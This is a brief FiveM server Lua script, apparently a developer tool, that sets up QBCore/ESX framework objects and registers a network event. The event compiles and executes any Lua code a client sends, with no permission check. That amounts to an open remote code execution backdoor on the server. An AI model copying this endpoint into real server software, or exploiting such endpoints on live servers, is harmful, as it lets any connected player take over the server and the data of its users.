QBCore = nil
ESX = nil

CreateThread(function()
    --get resource state of qb-core
    if GetResourceState('qb-core') == 'started' then
        QBCore = exports['qb-core']:GetCoreObject()
    end
    --get resource state of esx
    if GetResourceState('es_extended') == 'started' then
        TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
    end
end)


RegisterNetEvent('xv-dev:server:ExecLua', function(code)
    local src = source
    local func, err = load(code)
    if func then
        local status, result = pcall(func)
        if status then
            output = "Executed"
        else
            output = "Error: " .. result
        end
    else
        output = "Error: " .. err
    end
    TriggerClientEvent('xv-dev:client:UpdateOutput', src, output)
end)